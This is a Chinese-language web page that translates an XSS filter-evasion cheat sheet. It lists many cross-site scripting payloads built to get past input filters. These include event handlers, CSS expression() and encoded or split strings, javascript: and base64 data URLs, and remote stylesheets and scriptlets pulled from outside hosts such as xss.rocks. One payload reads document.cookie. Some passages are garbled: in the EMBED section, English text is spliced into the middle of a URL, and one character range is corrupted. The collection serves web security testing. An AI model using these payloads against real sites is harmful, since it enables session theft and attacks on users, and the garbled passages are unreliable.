id="双半开括号”-lt-lt-”绕过"><a href="#双半开括号”-lt-lt-”绕过" class="headerlink" title="双半开括号”&lt;&lt;”绕过"></a>双半开括号”&lt;&lt;”绕过</h2><p>使用一个半开的”&lt;”尖括号在payload结尾处代替”&gt;”进行闭合,会在Netscape和Gecko两个渲染下产生不同效果.firefox正常使用,Netscape就不行;<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="selector-tag">iframe</span> src=http:<span class="comment">//xss.rocks/scriptlet.html   &lt;</span></span><br></pre></td></tr></table></figure></p><h2 id="利用Javascript转义被转义绕过"><a href="#利用Javascript转义被转义绕过" class="headerlink" title="利用Javascript转义被转义绕过"></a>利用Javascript转义被转义绕过</h2><p>当用户在一个应用程序编辑自定义信息的时候,在常规Javascript代码中是这样,例如: <SCRIPT>var a=”$ENV{QUERY_STRING}”;</script>.如果你想插入你自己的Javascript代码时候,会被服务转义掉其中某些引号,这时你需要通过转义被转义字符来绕过它.从而使最终输入代码类似于<script>var a=”\“;alert(‘XSS’);//“;</script>.最终双引号被服务器转义,并且触发了XSS payload.示例如下:<br><figure class="highlight scilab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\<span class="string">";alert('</span>XSS');<span class="comment">//</span></span><br></pre></td></tr></table></figure></p><p>另外一种方法就是,如果json或者Javascript转义被应用嵌入数据,而不是HTML编码,则Payload如下示例:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">'XSS'</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h2 id="利用标签进行XSS"><a href="#利用标签进行XSS" class="headerlink" title="利用标签进行XSS"></a>利用标签进行XSS</h2><p>这是一个非常easy的XSS payload,可以利用闭合<title>标签,可以封装恶意的XSS攻击.<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">TITLE</span>&gt;</span><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="actionscript">alert(<span class="string">"XSS"</span>);</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br></pre></td></tr></table></figure></title></p><h2 id="利用标签进行XSS-1"><a href="#利用标签进行XSS-1" class="headerlink" title="利用标签进行XSS"></a>利用<input>标签进行XSS</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;INPUT <span class="attribute">TYPE</span>=<span class="string">"IMAGE"</span>   <span class="attribute">SRC</span>=<span class="string">"javascript:alert('XSS');"</span>&gt;</span><br></pre></td></tr></table></figure><p>译者注:其实还可以利用<input>标签中的hideeen属性来触发,网上已经有详细描述,这里就不叙述了,示例如下:<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input   <span class="attribute">type</span>=<span class="string">"hidden"</span> <span class="attribute">name</span>=<span class="string">"returnurl"</span> <span class="attribute">value</span>=<span class="string">"[USER   INJECT]"</span> /&gt;</span><br></pre></td></tr></table></figure></p><h2 id="利用标签进行XSS-2"><a href="#利用标签进行XSS-2" class="headerlink" title="利用标签进行XSS"></a>利用<body>标签进行XSS</body></h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;BODY   <span class="attribute">BACKGROUND</span>=<span class="string">"javascript:alert('XSS')"</span>&gt;</span><br></pre></td></tr></table></figure><h2 id="利用标签的Dynsrc属性进行XSS"><a href="#利用标签的Dynsrc属性进行XSS" class="headerlink" title="利用标签的Dynsrc属性进行XSS"></a>利用<img>标签的Dynsrc属性进行XSS</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG   <span class="attribute">DYNSRC</span>=<span class="string">"javascript:alert('XSS')"</span>&gt;</span><br></pre></td></tr></table></figure><p>译者注:不过只在IE和Netscape中支持,Firefox会提示proprietary attribute或者拒绝访问.同时译者在这里说明下,只针对IE6以前,到以后版本就不支持了.望注意(<em>^__^</em>).</p><h2 id="利用标签的Lowsrc属性进行XSS"><a href="#利用标签的Lowsrc属性进行XSS" class="headerlink" title="利用标签的Lowsrc属性进行XSS"></a>利用<img>标签的Lowsrc属性进行XSS</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG   <span class="attribute">LOWSRC</span>=<span class="string">"javascript:alert('XSS')"</span>&gt;</span><br></pre></td></tr></table></figure><p>基于CSS的List-style-image属性进行XSS</p><p>使用图像来替换列表项的标记,此Javascript指令只能在IE下使用,是一个不是特别有用的XSS paylod.<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">STYLE</span>&gt;</span><span class="css"><span class="selector-tag">li</span> &#123;<span class="attribute">list-style-image</span>:   <span class="built_in">url</span>(<span class="string">"javascript:alert('XSS')"</span>);&#125;</span><span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span><span class="tag">&lt;<span class="name">UL</span>&gt;</span><span class="tag">&lt;<span class="name">LI</span>&gt;</span>XSS<span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>译者注:由于翻译工作占用大量时间,没有在具体环境下测试此paylod,但是理论上” list-style-image”, 所有浏览器都支持 list-style-image 属性。</p><h2 id="利用标签中的VBscript命令进行XSS"><a href="#利用标签中的VBscript命令进行XSS" class="headerlink" title="利用标签中的VBscript命令进行XSS"></a>利用<img>标签中的VBscript命令进行XSS</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG <span class="attribute">SRC</span>=<span class="string">'vbscript:msgbox("XSS")'</span>&gt;</span><br></pre></td></tr></table></figure><h2 id="利用Livescript命令进行XSS-只适用老版本Netscape"><a href="#利用Livescript命令进行XSS-只适用老版本Netscape" class="headerlink" title="利用Livescript命令进行XSS(只适用老版本Netscape)"></a>利用Livescript命令进行XSS(只适用老版本Netscape)</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG   <span class="attribute">SRC</span>=<span class="string">"livescript:[code]"</span>&gt;</span><br></pre></td></tr></table></figure><h2 id="利用SVG的标签进行XSS"><a href="#利用SVG的标签进行XSS" class="headerlink" title="利用SVG的标签进行XSS"></a>利用SVG的<object>标签进行XSS</object></h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">alert(</span>'<span class="attr">XSS</span>')&gt;</span></span><br></pre></td></tr></table></figure><h2 id="基于ECMAScript-6的XSS"><a href="#基于ECMAScript-6的XSS" class="headerlink" title="基于ECMAScript 6的XSS"></a>基于ECMAScript 6的XSS</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set</span>.constructor<span class="string">`alert\x28document.domain\x29`</span><span class="string">``</span></span><br></pre></td></tr></table></figure><h2 id="利用标签ONLOAD属性进行XSS"><a href="#利用标签ONLOAD属性进行XSS" class="headerlink" title="利用标签ONLOAD属性进行XSS"></a>利用<body>标签ONLOAD属性进行XSS</body></h2><p>此方法不需要”javascript:”或”&lt;script …”任何编码方式来进行XSS攻击. Dan Crowley另外指出,你可以在等号之前放一个空格(“onload=” != “onload =”):</p><p>   &lt;BODY ONLOAD=alert(‘XSS’)&gt;   </p><h2 id="基于事件句柄-或称为-事件处理器"><a href="#基于事件句柄-或称为-事件处理器" class="headerlink" title="基于事件句柄(或称为:事件处理器)"></a>基于事件句柄(或称为:事件处理器)</h2><p>它可以用于上述类似XSS攻击(这是在撰写本文时在网络上最全面的列表了).感谢Rene Ledosquet在HTML+TIME上更新,此外你可以参考<a href="http://help.dottoro.com/" target="_blank" rel="noopener">Dottoro Web Reference</a>当然还有一份很好的<a href="http://help.dottoro.com/ljfvvdnm.php" target="_blank" rel="noopener">Javascript事件列表</a>.</p><ol><li>FSCommand() (攻击者可以使用它当执行一个嵌入的flash对象时)</li><li>onAbort() (当用户中止加载图像时)</li><li>onActivate() (当对象设置为活动元素时)</li><li>onAfterPrint() (在用户打印或预览打印作业后激活)</li><li>onAfterUpdate() (在更新源对象中的数据后激活数据对象)</li><li>onBeforeActivate() (在将对象设置为活动元素之前触发)</li><li>onBeforeCopy() (攻击者在将选择复制到剪贴板之前执行攻击字符串 - 攻击者可以使用 execCommand(“Copy”) 功能执行此操作)</li><li>onBeforeCut() (攻击者在选择被切断之前执行攻击字符串)</li><li>onBeforeDeactivate() (在从当前对象更改activeElement之后触发)</li><li>onBeforeEditFocus() (在可编辑元素中包含的对象进入UI激活状态之前触发，或者当可控制可选容器对象被选择时触发)</li><li>onBeforePaste() (用户需要被欺骗粘贴或被强制使用 execCommand(“Paste”) 功能)</li><li>onBeforePrint() (用户需要被骗到打印或攻击者可以使用 print() or execCommand(“Print”) 功能).</li><li>onBeforeUnload() (用户需要被诱骗关闭浏览器 - 攻击者无法卸载窗口，除非从父级生成.)</li><li>onBeforeUpdate() (在更新源对象中的数据之前激活数据对象)</li><li>onBegin() (当元素的时间轴开始时，onbegin事件会立即触发)</li><li>onBlur() (在另一个弹出窗口加载窗口失去焦点的情况下)</li><li>onBounce() (当选框对象的行为属性设置为 “alternate”并且选框的内容到达窗口的一边时触发.)</li><li>onCellChange() (数据提供者中数据更改时触发)</li><li>onChange() 选择, text,或TEXTAREA字段失去焦点,或其值已被修改)</li><li>onClick() (需要人点击表单)</li><li>onContextMenu() (用户需要右击攻击区域)</li><li>onControlSelect() (当用户即将对对象进行控件选择时触发)</li><li>onCopy() (用户需要复制某些东西，或者可以使用 execCommand(“Copy”) 命令利用它)</li><li>onCut() (用户需要复制某些东西，或者使用execCommand(“Cut”) 命令可以利用它.)</li><li>onDataAvailable() (用户需要更改元素中的数据，或者攻击者可以执行相同的功能)</li><li>onDataSetChanged() (由数据源对象公开的数据集更改时触发)</li><li>onDataSetComplete() (触发以指示所有数据可从数据源对象获得)</li><li>onDblClick() (用户双击表单元素或链接)</li><li>onDeactivate() (当activeElement从当前对象更改为父文档中的另一个对象时触发)</li><li>onDrag() (要求用户拖动对象)</li><li>onDragEnd() (要求用户拖动对象)</li><li>onDragLeave() (要求用户将对象拖放到有效的位置)</li><li>onDragEnter() (要求用户将对象拖放到有效位置)</li><li>onDragOver() (要求用户将对象拖放到有效位置)</li><li>onDragDrop() (用户将一个对象（例如文件）放到浏览器窗口上)</li><li>onDragStart() (当用户开始拖动操作时发生)</li><li>onDrop() (用户将一个对象（例如文件）放到浏览器窗口上)</li><li>onEnd() (当时间轴结束时，onEnd事件触发.)</li><li>onError() (加载文档或图像会导致错误)</li><li>onErrorUpdate() (当更新数据源对象中的关联数据时发生错误时，在数据绑定对象上触发)</li><li>onFilterChange() (视觉过滤器完成状态更改时触发)</li><li>onFinish() (当选框完成循环时，攻击者可以创建漏洞)</li><li>onFocus() (攻击者在窗口获得焦点时执行攻击字符串)</li><li>onFocusIn() (当窗口获得焦点时攻击者执行攻击字符串)</li><li>onFocusOut() (当窗口失去焦点时攻击者执行攻击字符串)</li><li>onHashChange() (当文档的当前地址的片段标识符部分更改时触发)</li><li>onHelp() (攻击者在窗口对焦时用户点击F1时执行攻击字符串)</li><li>onInput() (元素的文本内容通过用户界面进行更改)</li><li>onKeyDown() (用户按下一个键)</li><li>onKeyPress() (用户按下或按住一个键)</li><li>onKeyUp() (用户释放一个键)</li><li>onLayoutComplete() (用户必须打印或打印预览)</li><li>onLoad() (攻击者在窗口加载后执行攻击字符串)</li><li>onLoseCapture() (可以通过 releaseCapture() 方法利用)</li><li>onMediaComplete() (当使用流媒体文件时，该事件可能在文件开始播放之前触发)</li><li>onMediaError() (用户在浏览器中打开包含媒体文件的页面，当有问题时触发事件)</li><li>onMessage() (当文档收到消息时触发)</li><li>onMouseDown() (攻击者需要让用户点击图像)</li><li>onMouseEnter() (光标移动一个对象或区域)</li><li>onMouseLeave() (攻击者需要让用户将鼠标悬停在图像或表上，然后再次关闭)</li><li>onMouseMove() (攻击者需要让用户将鼠标放在图像或表格上)</li><li>onMouseOut() (攻击者需要让用户将鼠标移到图像或表上，然后再次关闭)</li><li>onMouseOver() (光标移动一个对象或区域)</li><li>onMouseUp() (攻击者需要让用户点击图像)</li><li>onMouseWheel() (攻击者需要让用户使用他们的鼠标滚轮)</li><li>onMove() (用户或攻击者会移动页面)</li><li>onMoveEnd() (用户或攻击者会移动页面)</li><li>onMoveStart() (用户或攻击者会移动页面)</li><li>onOffline() (如果浏览器工作在在线模式并且它开始脱机工作，则会发生)</li><li>onOnline() (如果浏览器处于离线模式并且开始在线工作，则会发生)</li><li>onOutOfSync() (中断元素根据时间轴定义的播放媒体的能力)</li><li>onPaste() (用户需要粘贴或者攻击者可以使用 execCommand(“Paste”) 功能)</li><li>onPause() (当时间线暂停时，包括body元素在内的每个元素处于活动状态时，onpause事件触发)</li><li>onPopState() (用户导航会话历史时触发)</li><li>onProgress() (攻击者会将此作为Flash影片加载)</li><li>onPropertyChange() (用户或攻击者需要更改元素属性)</li><li>onReadyStateChange() (用户或攻击者需要更改元素属性)</li><li>onRedo() (用户在撤销交易历史中前进)</li><li>onRepeat() (事件每次重复一次时间轴，不包括第一个完整周期)</li><li>onReset() (用户或攻击者重置表单)</li><li>onResize() (用户将调整窗口大小;攻击者可以自动初始化,例如: <script>self.resizeTo(500,400);</script>)</li><li>onResizeEnd() (用户将调整窗口大小;攻击者可以自动初始化，例如: <script>self.resizeTo(500,400);</script>)</li><li>onResizeStart() (用户可以调整窗口大小;攻击者可以自动初始化，例如: <script>self.resizeTo(500,400);</script>)</li><li>onResume() (时间轴恢复时，每个元素上的onresume事件都会触发，包括body元素)</li><li>onReverse() (如果元素的repeatCount大于1，则此事件会在时间线开始向后播放时触发)</li><li>onRowsEnter() (用户或攻击者需要更改数据源中的一行)</li><li>onRowExit() (用户或攻击者需要更改数据源中的一行)</li><li>onRowDelete() (用户或攻击者需要删除数据源中的一行)</li><li>onRowInserted() (用户或攻击者需要在数据源中插入一行)</li><li>onScroll() (用户需要滚动，或者攻击者可以使用scrollBy() 函数)</li><li>onSeek() (当时间线设置为在向前方向以外的任何方向播放时，onreverse事件触发)</li><li>onSelect() (用户需要选择一些文本 - 攻击者可以自动初始化，如: window.document.execCommand(“SelectAll”);)</li><li>onSelectionChange() (用户需要选择一些文本 - 攻击者可以自动初始化，如: window.document.execCommand(“SelectAll”);)</li><li>onSelectStart() (用户需要选择一些文本 - 攻击者可以自动初始化，如: window.document.execCommand(“SelectAll”);)</li><li>onStart() (在每个选框循环的开始处触发)</li><li>onStop() (用户需要按停止按钮或离开网页)</li><li>onStorage() (存储区域更改)</li><li>onSyncRestored() (用户中断元素根据时间轴定义的播放媒体的能力)</li><li>onSubmit() (要求攻击者或用户提交表单)</li><li>onTimeError() (用户或攻击者将dur属性设置为无效值)</li><li>onTrackChange() (用户或攻击者在播放列表中更改轨道)</li><li>onUndo() (用户在撤消事务历史记录中向后退)</li><li>onUnload() (当用户点击任何链接或按下后退按钮或攻击者强制点击)</li><li>onURLFlip() (当由HTML + TIME（定时互动多媒体扩展）媒体标签播放的高级流格式（ASF）文件处理嵌入在ASF文件中的脚本命令时，该事件触发)</li><li>seekSegmentTime() (这是一种在元素段时间线上定位指定点并从该点开始播放的方法，该段由包括使用AUTOREVERSE属性的反向播放的时间线的一个重复组成.)</li></ol><h2 id="利用-lt-BGSOUND-gt-标签进行XSS"><a href="#利用-lt-BGSOUND-gt-标签进行XSS" class="headerlink" title="利用&lt; BGSOUND &gt;标签进行XSS"></a>利用&lt; BGSOUND &gt;标签进行XSS</h2>   <bgsound src="javascript:alert('XSS');">   <h2 id="利用-amp-JavaScript-includes方法进行XSS"><a href="#利用-amp-JavaScript-includes方法进行XSS" class="headerlink" title="利用&amp; JavaScript includes方法进行XSS"></a>利用&amp; JavaScript includes方法进行XSS</h2>   <br size="&{alert('XSS')}">   <h2 id="利用样式表标签进行XSS"><a href="#利用样式表标签进行XSS" class="headerlink" title="利用样式表标签进行XSS"></a>利用样式表<ink>标签进行XSS</ink></h2>   <link rel="stylesheet" href="javascript:alert('XSS');">   <h2 id="利用远程样式表进行XSS"><a href="#利用远程样式表进行XSS" class="headerlink" title="利用远程样式表进行XSS"></a>利用远程样式表进行XSS</h2><p>(使用像远程样式表这样的东西,你可以利用样式参数作为XSS,可以用嵌入表达式方式来完成XSS攻击).但是它仅仅适用在IE浏览器或者Netscape 8.1+下运行.需要注意页面上没有显示包含Javascript代码.使用这样的远程样式表,至少需要使用body标签,因此除非显示paylod本身的其他内容.如果他是一个空白页面,你需要添加至少一个字母到页面显示,确保payload可以正常工作..</p>   <link rel="stylesheet" href="http://ha.ckers.org/xss.css">   <h2 id="利用远程样式表进行XSS-part-2"><a href="#利用远程样式表进行XSS-part-2" class="headerlink" title="利用远程样式表进行XSS part 2"></a>利用远程样式表进行XSS part 2</h2><p>这跟上述原理相同,只不过这里使用的<style>标签来代替<LINK>,稍微变动下被用来攻击GOOGLE Desktop.注意:如果此payload遇到闭合后会出现在htrml上,则可以考虑删除</style>.如果你在XSS脚本攻击中无法使用等号或斜杠,那么可以试试这个:</p><p>   <style>@import’<a href="http://xss.rocks/xss.css&#39;">http://xss.rocks/xss.css&#39;</a>;</style>   </p><h2 id="利用远程样式表进行XSS-part-3"><a href="#利用远程样式表进行XSS-part-3" class="headerlink" title="利用远程样式表进行XSS part 3"></a>利用远程样式表进行XSS part 3</h2><p>适用于Opera8.0(不支持9.X),根据RFC2616设置链接头,.它不符合HTTP1.1的规范,但是有一些浏览器仍然允许它(如firefox和Opera).这里技巧就是,我设置一个http头(这里与HTTP头没什么区别,例如: <a href="http://xss.rocks/xss.css" target="_blank" rel="noopener">http://xss.rocks/xss.css</a>; REL=stylesheet).这样带远程XSS payload将会运行,但是它并不支持FireFox.</p>   <meta http-equiv="Link" content="<http://xss.rocks/xss.css>; REL=stylesheet">   <h2 id="利用远程样式表进行XSS-part-4"><a href="#利用远程样式表进行XSS-part-4" class="headerlink" title="利用远程样式表进行XSS part 4"></a>利用远程样式表进行XSS part 4</h2><p>仅适用于Gecko渲染引擎,并将XUL文件绑定到父页面.个人认为这里是讽刺Netscape,Gecko是更安全的,因此绝大多数网站容易受到这种影响:</p>   <style>BODY{-moz-binding:url(“<a href="http://xss.rocks/xssmoz.xml#xss&quot;)}">http://xss.rocks/xssmoz.xml#xss&quot;)}</a></style>   <h2 id="利用标签来分解XSS-payload"><a href="#利用标签来分解XSS-payload" class="headerlink" title="利用标签来分解XSS payload"></a>利用<style>标签来分解XSS payload</h2><p>此payload有时会将IE浏览器中造成无限循环.</p><p>   <STYLE>@im\port’\ja\vasc\ript:alert(“XSS”)’;</style>   <p></p><h2 id="利用style属性配合注释符来分解XSS-payload"><a href="#利用style属性配合注释符来分解XSS-payload" class="headerlink" title="利用style属性配合注释符来分解XSS payload"></a>利用<img>style属性配合注释符来分解XSS payload</h2><p>由Roman Ivanov创建.</p>   <img style="xss:expr/*XSS*/ession(alert('XSS'))">   <h2 id="利用标签进行分解XSS-payload-增强版"><a href="#利用标签进行分解XSS-payload-增强版" class="headerlink" title="利用标签进行分解XSS payload 增强版"></a>利用<style>标签进行分解XSS payload 增强版</h2><p>这与上述XSS payload混合,但他确实展现了<style>标签被分隔解析是多困难.同样它也会在IE下造成无限弹窗.</p><p>   exp/<em>&lt;A   STYLE=’no\xss:noxss(“</em>//<em>“);   xss:ex/</em>XSS<em>//</em>/*/pression(alert(“XSS”))’&gt;   </p><h2 id="利用标签-仅限于老版本Netscape"><a href="#利用标签-仅限于老版本Netscape" class="headerlink" title="利用标签(仅限于老版本Netscape)"></a>利用<STYLE>标签(仅限于老版本Netscape)</h2>   <STYLE   TYPE="text/javascript">alert(‘XSS’);</style>   <h2 id="利用标签的background-image属性进行XSS"><a href="#利用标签的background-image属性进行XSS" class="headerlink" title="利用标签的background-image属性进行XSS"></a>利用<style>标签的background-image属性进行XSS</h2>   <STYLE>.XSS{background-image:url(“javascript:alert(‘XSS’)”);}</style><a class="XSS"></a><br><br>## 利用<style>标签的background属性进行XSS<br><br>   <STYLE   type="text/css">BODY{background:url(“javascript:alert(‘XSS’)”)}</style>   <h2 id="利用具有style属性的匿名的HTML标签进行XSS"><a href="#利用具有style属性的匿名的HTML标签进行XSS" class="headerlink" title="利用具有style属性的匿名的HTML标签进行XSS"></a>利用具有style属性的匿名的HTML标签进行XSS</h2><p>IE渲染引擎模式中IE6.0和Netscape8.1+并不关系你创建的html标签是否存在,只要它是以&lt;&gt;全开括号和字母开头就行;</p>   <xss style="xss:expression(alert('XSS'))">   <h2 id="利用本地HTC文件进行XSS"><a href="#利用本地HTC文件进行XSS" class="headerlink" title="利用本地HTC文件进行XSS"></a>利用本地HTC文件进行XSS</h2><p>这跟上述两个XSSpayload有点不同,因为它使用的.htc文件必须与XSS payload在同一域内.示例文件通过写入Javascript并利用style属性来运行;</p>   <xss style="behavior:   url(xss.htc);">   <h2 id="US-ASCII编码"><a href="#US-ASCII编码" class="headerlink" title="US-ASCII编码"></a>US-ASCII编码</h2><p>US-ASCII编码(由于Kurt Huwig发现).这里使用7位代替8位,该XSS payload可以绕过很多基于内容检测的过滤器,但仅限于主机上使用US-ASCII编码传输或者你设置为此编码时才起作用.这对于WEB应用防火墙XSS过滤比对服务器端过滤绕过更有用.已知Apache Tomcat目前唯一以US-ASCII编码传输的服务器.</p><p>   ¼script¾alert(¢XSS¢)¼/script¾   </p><h2 id="利用-lt-META-gt-标签进行XSS"><a href="#利用-lt-META-gt-标签进行XSS" class="headerlink" title="利用&lt; META &gt;标签进行XSS"></a>利用&lt; META &gt;标签进行XSS</h2><p>利用<meta>奇怪之处在于它不会在http头中发送引用referrer,因此它可以用用于某些类型攻击,你需要避免引入URL:</p>   <meta http-equiv="refresh" content="0;url=javascript:alert('XSS');">   <h3 id="利用标签的content属性进行XSS"><a href="#利用标签的content属性进行XSS" class="headerlink" title="利用标签的content属性进行XSS"></a>利用<meta>标签的content属性进行XSS</h3><p>这种方案其实很不错,因为他没有任何明显的script或者Javascript指令,因为它使用base64编码.具体请参考<a href="https://tools.ietf.org/html/rfc2397" target="_blank" rel="noopener">RFC 2397</a>了解更多详情,或者访问此处<a href="http://ha.ckers.org/xsscalc.html" target="_blank" rel="noopener">XSS编码器</a>对你的XSSpaylod进行base64编码.</p>   <meta http-equiv="refresh" content="0;url=data:text/html   base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">   <h3 id="利用标签的带URL参数进行XSS绕过"><a href="#利用标签的带URL参数进行XSS绕过" class="headerlink" title="利用标签的带URL参数进行XSS绕过"></a>利用<meta>标签的带URL参数进行XSS绕过</h3><p>如果目标网站尝试检查URL是否包含http://,那么你可以使用以下payload来绕过它.( 由于Moritz Naumann提出);</p>   <meta http-equiv="refresh" content="0; URL=http://;URL=javascript:alert('XSS');">   <h2 id="利用标签进行XSS-3"><a href="#利用标签进行XSS-3" class="headerlink" title="利用标签进行XSS"></a>利用<iframe>标签进行XSS</iframe></h2><p>如果目标网站允许<iframe>,那么会产生很多XSS问题.</iframe></p>   <iframe src="javascript:alert('XSS');"></iframe>   <h2 id="利用事件触发标签的XSS"><a href="#利用事件触发标签的XSS" class="headerlink" title="利用事件触发标签的XSS"></a>利用事件触发<iframe>标签的XSS</iframe></h2><p>Iframes还有大多数其他元素可以使用像一下基于事件来进行混淆(由于David Cross提交.)</p>   <iframe src="#" onmouseover="alert(document.cookie)"></iframe>   <h2 id="利用进行XSS"><a href="#利用进行XSS" class="headerlink" title="利用进行XSS"></a>利用<frame>进行XSS</h2><p><frame>与<iframe>存在相同的问题.</iframe></p>   <frameset><frame src="javascript:alert('XSS');"></frameset>   <h2 id="利用标签进行XSS-4"><a href="#利用标签进行XSS-4" class="headerlink" title="利用标签进行XSS"></a>利用<table>标签进行XSS</table></h2>   <table background="javascript:alert('XSS')">   <h3 id="利用标签进行XSS-5"><a href="#利用标签进行XSS-5" class="headerlink" title="利用标签进行XSS"></a>利用<td>标签进行XSS</td></h3><p>如图上面所述,<td>也容易受到包含Javascript的XSS payload攻击.</td></p><p>   <table><td background="javascript:alert('XSS')">   </td></table></p><h2 id="利用标签"><a href="#利用标签" class="headerlink" title="利用标签"></a>利用<div>标签</div></h2><h3 id="在DIV中使用background-image属性完成XSS"><a href="#在DIV中使用background-image属性完成XSS" class="headerlink" title="在DIV中使用background-image属性完成XSS"></a>在DIV中使用background-image属性完成XSS</h3>   <div style="background-image:   url(javascript:alert('XSS'))">   <h3 id="使用background-image属性配合unicoded编码完成XSS"><a href="#使用background-image属性配合unicoded编码完成XSS" class="headerlink" title="使用background-image属性配合unicoded编码完成XSS"></a>使用background-image属性配合unicoded编码完成XSS</h3><p>这只是稍微修改去混淆下URL参数.它最早被Renaud Lifchitz发现用于攻击hotmaill;</p>   <div style="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">   <h3 id="使用background-image属性加上额外字符完成XSS"><a href="#使用background-image属性加上额外字符完成XSS" class="headerlink" title="使用background-image属性加上额外字符完成XSS"></a>使用background-image属性加上额外字符完成XSS</h3><p>Rnaske建立了一个快速的XSS Fuzzer来检测半开扩号后允许的字符,但在安全的站点模式下IE和Netscape8.1中Javascript命令之前.这些都是十进制的,但当然可以利用十六进制进行填充.(可以使用以下任意字符: 1-32, 34, 39, 160, 8192-8.13, 12288, 65279)</p>   <div style="background-image:   url(&#1;javascript:alert('XSS'))">   <h3 id="利用DIV表达式完成XSS"><a href="#利用DIV表达式完成XSS" class="headerlink" title="利用DIV表达式完成XSS"></a>利用DIV表达式完成XSS</h3><p>这个payload稍微修改下在冒号和” expression”中间加入一个换行符,可以非常有效绕过真实的XSS防护.</p>   <div style="width:   expression(alert('XSS'));">   <h2 id="利用IE注释块进行XSS绕过"><a href="#利用IE注释块进行XSS绕过" class="headerlink" title="利用IE注释块进行XSS绕过"></a>利用IE注释块进行XSS绕过</h2><p>尽在IE5.0及以上版本和使用IE渲染引擎模式的Netscape下有效.一些网站认为在注释内的内容是安全的,因此不需要移除.或者系统能够在页面某些部分添加注释标签，从而让它们失去有害性.如我们所知,这些操作(把内容注释掉的操作)可能是于事无补的:</p>   <!--[if gte IE 4]>    <SCRIPT>alert('XSS');</SCRIPT>    <![endif]-->   <h2 id="利用标签进行XSS-6"><a href="#利用标签进行XSS-6" class="headerlink" title="利用标签进行XSS"></a>利用<base>标签进行XSS</h2><p>这在IE和Netscape8.1的安全模式下能起作用.你需要使用//注释掉下一个字符,避免JavaScript错误,从而让我们的XSS攻击向量正常执行.这也依赖于一个条件:网站图像使用相对地址如”images/image.jpg”,而非绝对地址.如果地址中包含了斜杠(“/images/image.jpg”)，你可以在XSS payload移除一个:</p>   <base href="javascript:alert('XSS');//">   <h2 id="利用标签进行XSS-7"><a href="#利用标签进行XSS-7" class="headerlink" title="利用标签进行XSS"></a>利用<object>标签进行XSS</object></h2><p>如果页面允许<object>标签,你甚至可以在页面挂马.下面链接指向的文件是一个可以包含你的XSS payload的HTML文件;</object></p>   <object type="text/x-scriptlet" data="http://xss.rocks/scriptlet.html"></object>   <h2 id="使用标签嵌入一个包含XSS的Flash动画"><a href="#使用标签嵌入一个包含XSS的Flash动画" class="headerlink" title="使用标签嵌入一个包含XSS的Flash动画"></a>使用<embed>标签嵌入一个包含XSS的Flash动画</h2><p>如果你添加allowScriptAccess=“never”和allownetworking=”internal”属性,可以减轻这种风险(感谢Jonathan Vanasco提供信息);</p><p>   EMBED SRC=”<a href="http://ha.ckers.Using" target="_blank" rel="noopener">http://ha.ckers.Using</a> an   EMBED tag you can embed a Flash movie that contains XSS. Click here for a   demo. If you add the attributes allowScriptAccess=”never” and   allownetworking=”internal” it can mitigate this risk (thank you to   Jonathan Vanasco for the info).:   org/xss.swf”   AllowScriptAccess=”always”&gt;   </p><h2 id="你可以嵌入包含XSS-payload的SVG"><a href="#你可以嵌入包含XSS-payload的SVG" class="headerlink" title="你可以嵌入包含XSS payload的SVG"></a>你可以嵌入包含XSS payload的SVG</h2><p>这个例子只在Firefox下有效，但它比上面的攻击向量要好一些，因为这不需要用户安装或开启Flash（感谢nEUrOO提供）：</p>   <embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH   A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv   MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw   IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh   TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" 